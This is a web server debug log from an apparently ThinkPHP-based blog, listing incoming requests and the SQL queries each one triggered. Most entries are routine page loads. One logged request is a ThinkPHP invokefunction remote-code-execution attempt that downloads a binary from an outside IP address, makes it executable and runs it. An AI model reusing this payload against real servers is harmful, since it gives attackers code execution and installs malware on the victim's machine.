[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000479s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001592s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000553s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000532s ]
---------------------------------------------------------------
[2019-05-08T22:48:43+08:00] 172.18.0.2 GET blog/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://83.166.246.230/bins/hot;%20chmod%20777%20hot;./hot%20thinkphp
[ sql ] [ DB ] CONNECT:[ UseTime:0.001203s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001798s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000430s ]
---------------------------------------------------------------
[2019-05-08T23:25:15+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.000934s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001704s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000414s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001434s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000385s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001320s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000423s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000366s ]
---------------------------------------------------------------
[2019-05-08T23:25:18+08:00] 172.18.0.2 GET blog/index/list?type=0&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001807s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002999s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `is_delete` = 0 LIMIT 1 [ RunTime:0.000644s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000640s ]
